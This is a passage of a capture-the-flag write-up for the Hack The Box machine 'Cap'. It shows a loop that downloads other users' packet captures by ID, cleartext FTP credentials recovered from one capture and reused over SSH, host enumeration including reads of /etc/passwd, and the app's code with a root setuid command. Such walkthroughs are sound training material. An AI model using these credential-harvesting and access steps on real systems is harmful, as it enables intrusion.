z-end z-shell">}</span></span>.pcap<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">url</span></span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-punctuation z-section z-expansion z-parameter z-begin z-shell">{</span></span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-variable z-other z-readwrite z-shell">number</span></span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-section z-expansion z-parameter z-end z-shell">}</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span><span class="z-source z-shell z-bash">    <span class="z-keyword z-control z-conditional z-else z-shell">else</span>
+</span><span class="z-source z-shell z-bash">        <span class="z-keyword z-control z-flow z-break z-shell">break</span>
+</span><span class="z-source z-shell z-bash">    <span class="z-keyword z-control z-conditional z-end z-shell">fi</span>
+</span><span class="z-source z-shell z-bash"><span class="z-keyword z-control z-loop z-end z-shell">done</span>
+</span></code></pre>
+<p>I'll save it as <code>capture_downloader.sh</code>, and I'll make it executable.</p>
+<p>Then I'll run it.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> /workspace/capture_downloader.sh</span>
+</span></code></pre>
+<p>Let's see all the files we just downloaded.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> ls<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>la</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/workspace/pcaps<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">drwxr-xr-x 2 root root 4096 Feb  3 18:16 .
+</span><span class="z-text z-plain">drwxr-xr-x 4 root root 4096 Feb  3 18:15 ..
+</span><span class="z-text z-plain">-rw-r--r-- 1 root root 9935 Feb  3 18:16 0.pcap
+</span><span class="z-text z-plain">-rw-r--r-- 1 root root   24 Feb  3 18:16 1.pcap
+</span><span class="z-text z-plain">-rw-r--r-- 1 root root   24 Feb  3 18:16 2.pcap
+</span></code></pre>
+<p>There's three PCAP files!</p>
+<h4 id="inspecting-the-pcap-files">Inspecting the <code>.pcap</code> files</h4>
+<p>Upon inspection of all files, <code>0.pcap</code> is the one that holds valuable
+information.</p>
+<p>Interestingly, this PCAP file contains unencrypted FTP communications. We can
+see in cleartext that the credentials <code>nathan</code>:<code>Buck3tH4TF0RM3!</code> have been used
+by a user to connect to the server. The user then issued a few commands, but
+<code>RETR notes.txt</code> is the most noteworthy.</p>
+<h3 id="ftp-1">FTP</h3>
+<h4 id="exploring-the-filesystem-1">Exploring the filesystem</h4>
+<p>Back to the FTP server, let's use the credentials we just discovered to connect
+to it.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> ftp <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.245<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">Name (10.10.10.245:root): nathan
+</span><span class="z-text z-plain">331 Please specify the password.
+</span><span class="z-text z-plain">Password: 
+</span><span class="z-text z-plain">230 Login successful.
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">ftp&gt;
+</span></code></pre>
+<p>Now let's see what it contains.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">ftp</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span> ls<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>la</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">drwxr-xr-x    3 1001     1001         4096 May 27  2021 .
+</span><span class="z-text z-plain">drwxr-xr-x    3 0        0            4096 May 23  2021 ..
+</span><span class="z-text z-plain">lrwxrwxrwx    1 0        0               9 May 15  2021 .bash_history -&gt; /dev/null
+</span><span class="z-text z-plain">-rw-r--r--    1 1001     1001          220 Feb 25  2020 .bash_logout
+</span><span class="z-text z-plain">-rw-r--r--    1 1001     1001         3771 Feb 25  2020 .bashrc
+</span><span class="z-text z-plain">drwx------    2 1001     1001         4096 May 23  2021 .cache
+</span><span class="z-text z-plain">-rw-r--r--    1 1001     1001          807 Feb 25  2020 .profile
+</span><span class="z-text z-plain">lrwxrwxrwx    1 0        0               9 May 27  2021 .viminfo -&gt; /dev/null
+</span><span class="z-text z-plain">-r--------    1 1001     1001           33 Feb 03 16:57 user.txt
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>We don't find the <code>notes.txt</code> requested by the user in the <code>0.pcap</code> file, but we
+find many files and folders, which could belong to a home folder.</p>
+<p>It contains the user flag, but I'll grab it later.</p>
+<h2 id="foothold-ssh">Foothold (SSH)</h2>
+<p>Let's try the credentials <code>nathan</code>:<code>Buck3tH4TF0RM3!</code> to connect to Cap over SSH.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> ssh <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>nathan@10.10.10.245<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">The authenticity of host &#39;10.10.10.245 (10.10.10.245)&#39; can&#39;t be established.
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">nathan@10.10.10.245&#39;s password:
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">nathan@cap:~$
+</span></code></pre>
+<p>Nice!</p>
+<h2 id="getting-a-lay-of-the-land">Getting a lay of the land</h2>
+<p>If we run <code>whoami</code>, we see that we got a foothold as <code>nathan</code> (obviously).</p>
+<h3 id="architecture">Architecture</h3>
+<p>What is Cap's architecture?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">nathan@cap:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> uname<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>m</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">x86_64
+</span></code></pre>
+<p>It's using x86_64. Let's keep that in mind to select the appropriate binaries.</p>
+<h3 id="distribution">Distribution</h3>
+<p>Let's see which distribution Cap is using.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">nathan@cap:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/lsb-release<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">DISTRIB_ID=Ubuntu
+</span><span class="z-text z-plain">DISTRIB_RELEASE=20.04
+</span><span class="z-text z-plain">DISTRIB_CODENAME=focal
+</span><span class="z-text z-plain">DISTRIB_DESCRIPTION=&quot;Ubuntu 20.04.2 LTS&quot;
+</span></code></pre>
+<p>Okay, so it's Ubuntu 20.04.</p>
+<h3 id="kernel">Kernel</h3>
+<p>Let's find the kernel version of Cap.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">nathan@cap:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> uname<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>r</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">5.4.0-80-generic
+</span></code></pre>
+<p>It's <code>5.4.0</code>.</p>
+<h3 id="users">Users</h3>
+<p>Let's enumerate all users.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">nathan@cap:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> grep <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>.*sh$<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/passwd<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">cut</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>:<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sort</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">nathan
+</span><span class="z-text z-plain">root
+</span></code></pre>
+<p>There's <code>nathan</code> (us) and <code>root</code>.</p>
+<h3 id="groups">Groups</h3>
+<p>Let's enumerate all groups.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">nathan@cap:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/group<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">cut</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>:<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sort</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">adm
+</span><span class="z-text z-plain">audio
+</span><span class="z-text z-plain">backup
+</span><span class="z-text z-plain">bin
+</span><span class="z-text z-plain">cdrom
+</span><span class="z-text z-plain">crontab
+</span><span class="z-text z-plain">daemon
+</span><span class="z-text z-plain">dialout
+</span><span class="z-text z-plain">dip
+</span><span class="z-text z-plain">disk
+</span><span class="z-text z-plain">fax
+</span><span class="z-text z-plain">floppy
+</span><span class="z-text z-plain">ftp
+</span><span class="z-text z-plain">games
+</span><span class="z-text z-plain">gnats
+</span><span class="z-text z-plain">input
+</span><span class="z-text z-plain">irc
+</span><span class="z-text z-plain">kmem
+</span><span class="z-text z-plain">kvm
+</span><span class="z-text z-plain">landscape
+</span><span class="z-text z-plain">list
+</span><span class="z-text z-plain">lp
+</span><span class="z-text z-plain">lxd
+</span><span class="z-text z-plain">mail
+</span><span class="z-text z-plain">man
+</span><span class="z-text z-plain">messagebus
+</span><span class="z-text z-plain">nathan
+</span><span class="z-text z-plain">netdev
+</span><span class="z-text z-plain">news
+</span><span class="z-text z-plain">nogroup
+</span><span class="z-text z-plain">operator
+</span><span class="z-text z-plain">plugdev
+</span><span class="z-text z-plain">proxy
+</span><span class="z-text z-plain">render
+</span><span class="z-text z-plain">root
+</span><span class="z-text z-plain">sasl
+</span><span class="z-text z-plain">shadow
+</span><span class="z-text z-plain">src
+</span><span class="z-text z-plain">ssh
+</span><span class="z-text z-plain">ssl-cert
+</span><span class="z-text z-plain">staff
+</span><span class="z-text z-plain">sudo
+</span><span class="z-text z-plain">sys
+</span><span class="z-text z-plain">syslog
+</span><span class="z-text z-plain">systemd-coredump
+</span><span class="z-text z-plain">systemd-journal
+</span><span class="z-text z-plain">systemd-network
+</span><span class="z-text z-plain">systemd-resolve
+</span><span class="z-text z-plain">systemd-timesync
+</span><span class="z-text z-plain">tape
+</span><span class="z-text z-plain">tcpdump
+</span><span class="z-text z-plain">tss
+</span><span class="z-text z-plain">tty
+</span><span class="z-text z-plain">users
+</span><span class="z-text z-plain">utmp
+</span><span class="z-text z-plain">uucp
+</span><span class="z-text z-plain">uuidd
+</span><span class="z-text z-plain">video
+</span><span class="z-text z-plain">voice
+</span><span class="z-text z-plain">www-data
+</span></code></pre>
+<p>The <code>lxd</code> group is interesting to elevate privileges.</p>
+<h3 id="nics">NICs</h3>
+<p>Let's gather the list of connected NICs.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">nathan@cap:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> ifconfig</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+</span><span class="z-text z-plain">        inet 10.10.10.245  netmask 255.255.255.0  broadcast 10.10.10.255
+</span><span class="z-text z-plain">        inet6 dead:beef::250:56ff:feb9:368a  prefixlen 64  scopeid 0x0&lt;global&gt;
+</span><span class="z-text z-plain">        inet6 fe80::250:56ff:feb9:368a  prefixlen 64  scopeid 0x20&lt;link&gt;
+</span><span class="z-text z-plain">        ether 00:50:56:b9:36:8a  txqueuelen 1000  (Ethernet)
+</span><span class="z-text z-plain">        RX packets 1710  bytes 190809 (190.8 KB)
+</span><span class="z-text z-plain">        RX errors 0  dropped 61  overruns 0  frame 0
+</span><span class="z-text z-plain">        TX packets 1780  bytes 337962 (337.9 KB)
+</span><span class="z-text z-plain">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
+</span><span class="z-text z-plain">        inet 127.0.0.1  netmask 255.0.0.0
+</span><span class="z-text z-plain">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
+</span><span class="z-text z-plain">        loop  txqueuelen 1000  (Local Loopback)
+</span><span class="z-text z-plain">        RX packets 1450  bytes 111669 (111.6 KB)
+</span><span class="z-text z-plain">        RX errors 0  dropped 0  overruns 0  frame 0
+</span><span class="z-text z-plain">        TX packets 1450  bytes 111669 (111.6 KB)
+</span><span class="z-text z-plain">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+</span></code></pre>
+<p>There's an Ethernet interface and the loopback interface.</p>
+<h3 id="hostname">Hostname</h3>
+<p>What is Cap's hostname?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">nathan@cap:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> hostname</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">cap
+</span></code></pre>
+<p>Yeah I know, very surprising.</p>
+<h2 id="system-enumeration">System enumeration</h2>
+<h3 id="flags">Flags</h3>
+<p>If we check our home folder, we find the user flag.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">nathan@cap:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/home/nathan/user.txt<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">5a9608844c0978d62a4cceaa6243a018
+</span></code></pre>
+<h3 id="website-code-review">Website code review</h3>
+<p>Let's review the content of the Gunicorn website, located at <code>/var/www/html</code>.</p>
+<p>The <code>app.py</code> file holds the logic of the website. It uses Flask under the hood
+to serve a handful of routes. The <code>/capture</code> one is interesting:</p>
+<pre data-lang="py" class="language-py z-code"><code class="language-py" data-lang="py"><span class="z-source z-python"><span class="z-keyword z-operator z-comparison z-python">&lt;</span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-other z-constant z-python">SNIP</span></span><span class="z-keyword z-operator z-comparison z-python">&gt;</span>
+</span><span class="z-source z-python"><span class="z-meta z-annotation z-python"><span class="z-punctuation z-definition z-annotation z-python">@</span><span class="z-meta z-annotation z-function z-python"></span></span><span class="z-meta z-annotation z-function z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">app</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-annotation z-function z-python"><span class="z-meta z-generic-name z-python">route</span></span></span></span><span class="z-meta z-annotation z-function z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span></span><span class="z-meta z-annotation z-arguments z-python"><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">/capture<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span></span><span class="z-meta z-annotation z-function z-python"><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span><span class="z-source z-python"><span class="z-meta z-annotation z-python"><span class="z-punctuation z-definition z-annotation z-python">@</span><span class="z-meta z-annotation z-function z-python"></span></span><span class="z-meta z-annotation z-function z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">limiter</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-annotation z-function z-python"><span class="z-meta z-generic-name z-python">limit</span></span></span></span><span class="z-meta z-annotation z-function z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span></span><span class="z-meta z-annotation z-arguments z-python"><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">10 per minute<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span></span><span class="z-meta z-annotation z-function z-python"><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span><span class="z-source z-python"><span class="z-meta z-function z-python"><span class="z-storage z-type z-function z-python"><span class="z-keyword z-declaration z-function z-python">def</span></span> <span class="z-entity z-name z-function z-python"><span class="z-meta z-generic-name z-python">capture</span></span></span><span class="z-meta z-function z-parameters z-python"><span class="z-punctuation z-section z-parameters z-begin z-python">(</span></span><span class="z-meta z-function z-parameters z-python"><span class="z-punctuation z-section z-parameters z-end z-python">)</span></span><span class="z-meta z-function z-python"><span class="z-punctuation z-section z-function z-begin z-python">:</span></span>
+</span><span class="z-source z-python">
+</span><span class="z-source z-python">    <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">get_lock</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span><span class="z-source z-python">    <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">pcapid</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">get_appid</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span><span class="z-source z-python">    <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">increment_appid</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span><span class="z-source z-python">    <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">release_lock</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span><span class="z-source z-python">
+</span><span class="z-source z-python">    <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">path</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">os</span><span class="z-punctuation z-accessor z-dot z-python">.</span><span class="z-meta z-generic-name z-python">path</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">join</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">app</span><span class="z-punctuation z-accessor z-dot z-python">.</span><span class="z-meta z-generic-name z-python">root_path</span></span><span class="z-punctuation z-separator z-arguments z-python">,</span> <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">upload<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span><span class="z-punctuation z-separator z-arguments z-python">,</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-support z-type z-python">str</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">pcapid</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span> <span class="z-keyword z-operator z-arithmetic z-python">+</span> <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">.pcap<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span><span class="z-source z-python">    <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">ip</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">request</span><span class="z-punctuation z-accessor z-dot z-python">.</span><span class="z-meta z-generic-name z-python">remote_addr</span></span>
+</span><span class="z-source z-python">    <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> permissions issues with gunicorn and threads. hacky solution for now.
+</span></span><span class="z-source z-python">    <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span>os.setuid(0)
+</span></span><span class="z-source z-python">    <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span>command = f&quot;timeout 5 tcpdump -w {path} -i any host {ip}&quot;
+</span></span><span class="z-source z-python">    <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">command</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-storage z-type z-string z-python">f</span><span class="z-meta z-string z-interpolated z-python"><span class="z-string z-quoted z-double z-block z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;&quot;&quot;</span></span></span><span class="z-meta z-string z-interpolated z-python"><span class="z-string z-quoted z-double z-block z-python">python3 -c &#39;import os; os.setuid(0); os.system(&quot;timeout 5 tcpdump -w </span><span class="z-meta z-interpolation z-python"><span class="z-punctuation z-section z-interpolation z-begin z-python">{</span><span class="z-source z-python z-embedded"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">path</span></span></span></span><span class="z-meta z-interpolation z-python"><span class="z-punctuation z-section z-interpolation z-end z-python">}</span></span><span class="z-string z-quoted z-double z-block z-python"> -i any host </span><span class="z-meta z-interpolation z-python"><span class="z-punctuation z-section z-interpolation z-begin z-python">{</span><span class="z-source z-python z-embedded"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">ip</span></span></span></span><span class="z-meta z-interpolation z-python"><span class="z-punctuation z-section z-interpolation z-end z-python">}</span></span><span class="z-string z-quoted z-double z-block z-python">&quot;)&#39;<span class="z-punctuation z-definition z-string z-begin z-python">&quot;&quot;&quot;</span></span></span>
+</span><span class="z-source z-python">    <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">os</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">system</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">command</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span><span class="z-source z-python">    <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span>os.setuid(1000)
+</span></span><span class="z-source z-python">
